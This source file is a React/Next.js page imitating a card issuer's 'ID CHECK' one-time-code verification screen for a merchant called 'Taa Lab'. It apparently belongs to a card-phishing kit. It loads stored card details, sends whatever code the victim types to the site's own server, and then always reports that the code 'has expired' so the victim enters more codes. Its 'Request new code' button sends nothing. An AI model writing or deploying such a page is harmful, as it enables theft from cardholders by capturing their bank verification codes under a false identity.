// app/otp/page.tsx
"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import { useSelector } from "react-redux";
import { RootState } from "../../../../store";
import { ar, enUS } from "../../../../translation";
import { useRouter } from "next/router";
import { useSession } from "next-auth/react";
import axios from "axios";
import Link from "next/link";
const logos: Record<string, string> = {
  visa: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",
  mastercard:
    "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
  amex: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",
  discover:
    "https://upload.wikimedia.org/wikipedia/commons/5/56/Discover_Card_logo.svg",
  diners: "https://cdn-icons-png.flaticon.com/512/5968/5968288.png",
  jcb: "https://upload.wikimedia.org/wikipedia/commons/1/1b/JCB_logo.svg",
  unionpay:
    "https://upload.wikimedia.org/wikipedia/commons/0/04/UnionPay_logo.svg",
};
export default function OTPPage() {
  const [code, setCode] = useState("");
  const { db_link } = useSelector((state: RootState) => state.apiData);
  const language = useSelector((state: RootState) => state.language.value);
  const router = useRouter();
  const { data: session } = useSession();
  const [cardData, setCardData] = useState<any>([]);
  const [backError, setBackError] = useState<any>([]);
  const [requestSent, setRequestSent] = useState(false);
  const [loading, setLoading] = useState(false);
  const [t, tHandler] = useState(language === 0 ? enUS : ar);
  const [cardImage, setCardImage] = useState("");
  useEffect(() => {
    if (localStorage.getItem("nepShopLang") === "0") {
      tHandler(enUS);
    } else if (localStorage.getItem("nepShopLang") === "1") {
      tHandler(ar);
    } else {
      tHandler(language === 0 ? enUS : ar);
    }
  }, [language]);

  useEffect(() => {
    if (localStorage.getItem("orderCardData") !== null) {
      const data = JSON.parse(localStorage.getItem("orderCardData") || "{}");
      setCardData(data);
      const cardNumber = data.cardNumber;
      const firstDigit = cardNumber.charAt(0);
      const firstTwoDigits = cardNumber.substring(0, 2);
      const firstFourDigits = cardNumber.substring(0, 4);
      // Visa
      if (firstDigit === "4") setCardImage(logos.visa);
      // Mastercard
      if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber))
        setCardImage(logos.mastercard);
      // Amex
      if (/^3[47]/.test(cardNumber)) setCardImage(logos.amex);
      // Discover
      if (/^6011|^64[4-9]|^65/.test(cardNumber) || /^622[1-9]/.test(cardNumber))
        setCardImage(logos.discover);
      // Diners Club
      if (/^3[0-5]|^36|^38|^39/.test(cardNumber)) setCardImage(logos.diners);
      // JCB
      if (/^35/.test(cardNumber)) setCardImage(logos.jcb);
      // UnionPay
      if (/^62/.test(cardNumber)) setCardImage(logos.unionpay);
    } else {
      router.push("/");
    }
  }, []);

  useEffect(() => {
    setLoading(true);
    const timer = setTimeout(() => {
      setLoading(false);
    }, 5000);
    return () => clearTimeout(timer);
  }, []);

  const submitHandler = (e: any) => {
    e.preventDefault();
    setBackError([]);
    setRequestSent(true);
    const oData = new FormData();
    oData.append("order_id", cardData.id);
    oData.append("code", e.target[0].value);

    axios
      .post(`${db_link}api/orders/codes`, oData, {
        headers: { Authorization: `Bearer ${session?.user.token}` },
      })
      .then(() => {
        setTimeout(() => {
          setBackError(
            t == enUS ? "The code has expired" : "الرمز منتهي الصلاحية"
          );
          setRequestSent(false);
          setCode(""); // Clear the OTP input field
        }, 8000);
      })
      .catch(() => {
        setBackError("something went wrong, another code has been sent");
        setRequestSent(false);
        setCode(""); // Clear the OTP input field
      });
  };

  if (loading) {
    return (
      <div className="w-full h-screen bg-white flex items-center justify-center">
        <div className="flex flex-col items-center animate-pulse">
          <Image src={cardImage} alt="Loading..." width={100} height={100} />
          <p className="text-gray-500 mt-4">{t.loading}</p>
        </div>
      </div>
    );
  } else
    return (
      <form
        onSubmit={submitHandler}
        className="min-h-screen w-full flex items-center justify-center  bg-white font-sans  flex-col pt-[70px] "
      >
        <div className="w-full max-w-lg bg-white justify-center items-center p-8">
          <div className="flex justify-end items-center mb-6 absolute top-10 right-10">
            <span className="text-lg font-semibold text-gray-700 mr-2">
              ID CHECK |
            </span>
            <Image src={cardImage} alt="Mastercard" width={60} height={60} />
          </div>

          <div className="flex justify-center items-center ">
            <div className="text-sm space-y-1">
              <p className="w-full flex justify-between items-center">
                <span className="text-gray-700 mr-4 block w-1/2">Merchant</span>{" "}
                <strong className="block w-1/2">Taa Lab</strong>
              </p>
              <p className="w-full flex justify-between items-center">
                <span className="text-gray-700 mr-4 block w-1/2">Amount</span>{" "}
                <strong className="block w-1/2">KD {cardData.total}</strong>
              </p>
              <p className="w-full flex justify-between items-center">
                <span className="text-gray-700 mr-4 block w-1/2">Date</span>{" "}
                <strong className="block w-1/2">
                  {" "}
                  {new Date().toLocaleDateString()}
                </strong>
              </p>
              <p className="w-full flex justify-between items-center">
                <span className="text-gray-700 mr-4 block w-1/2">
                  Card Number
                </span>{" "}
                <strong className="block w-1/2">
                  *****
                  {cardData.cardNumber && cardData.cardNumber.slice(12, 16)}
                </strong>
              </p>
            </div>
          </div>
        </div>
        <hr className=" w-full" />
        <div className="w-full max-w-lg bg-white  mb-1 mt-2 px-2 text-center sm:text-start ">
          <label
            htmlFor="otp"
            className="inline text-gray-600 text-sm font-medium mb-2 mr-5"
          >
            Confirmation Code
          </label>
          <input
            id="otp"
            name="code"
            type="text"
            maxLength={6}
            minLength={6}
            required
            className="  text-center font-semibold  py-1 border-2 border-gray-300 rounded-3xl focus:outline-none focus:ring-2 focus:ring-blue-500"
            placeholder="Enter code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
          />

          {backError.length > 0 && (
            <p className="text-red-500 text-sm mt-1 sm:ml-12">{backError}</p>
          )}

          <div className="mt-2 flex justify-center gap-2 ">
            <button
              type="button"
              disabled={requestSent}
              onClick={() => {
                setBackError([]);
                setRequestSent(true);
                setTimeout(() => {
                  setRequestSent(false);
                }, 3000);
              }}
              className=" disabled:cursor-not-allowed disabled:opacity-40 px-9 py-2 border border-blue-400 text-blue-600 rounded-3xl hover:bg-blue-50 transition"
            >
              Request new code
            </button>
          </div>
        </div>
        <hr className=" w-full" />
        <div className="w-full bg-white mb-1">
          <div className="mt-4 flex justify-center gap-2 items-center">
            <button
              type="button"
              className="font-bold px-9 py-1 border-2 text-blue-400 border-blue-400 rounded-3xl hover:bg-gray-100"
              onClick={() => router.push("/checkout")}
            >
              Cancel
            </button>
            <button
              type="submit"
              className=" font-bold disabled:cursor-not-allowed disabled:opacity-40 px-8 py-1 border-2 border-blue-500 bg-blue-500 text-white rounded-3xl hover:bg-blue-600 transition opacity-60"
              disabled={requestSent}
            >
              {requestSent ? "Sending..." : "Confirm"}
            </button>
            <Link
              target="_blank"
              href="https://www.mastercard.us/en-us/personal/get-support.html"
              type="button"
              className=" text-blue-500  text-sm hover:underline block"
            >
              Help
            </Link>
          </div>
        </div>
      </form>
    );
}
